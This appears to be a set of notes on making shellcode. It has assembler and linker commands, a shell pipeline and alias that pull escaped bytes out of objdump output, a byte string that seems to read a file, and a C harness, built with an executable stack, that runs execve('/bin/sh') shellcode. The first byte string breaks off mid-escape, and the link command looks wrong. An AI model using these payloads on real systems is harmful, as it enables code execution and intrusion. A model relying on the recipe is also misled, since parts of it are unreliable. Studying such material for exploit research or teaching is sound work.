# 1. Compile assembly into machine code
nasm -f elf64 shell.asm

# 2. Link Dependency
ld -d shell.bin shell.o

# 3. Build shell code from a compiled binary
objdump -d shell.bin | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
alias shellcode='grep '"'"'[0-9a-f]:'"'"'|grep -v '"'"'file'"'"'|cut -f2 -d:|cut -f1-6 -d'"'"' '"'"'|tr -s '"'"' '"'"'|tr '"'"'\t'"'"' '"'"' '"'"'|sed '"'"'s/ $//g'"'"'|sed '"'"'s/ /\\x/g'"'"'|paste -d '"'"''"'"' -s |sed '"'"'s/^/"/'"'"'|sed '"'"'s/$/"/g'"'"''

```binary
\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x
```

# 4. Shell code is ready. Can be tested in a C program


# References
[]

# Test with c++ program
g++ -w -fpermissive -z execstack stdin.cpp  -o stdin


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}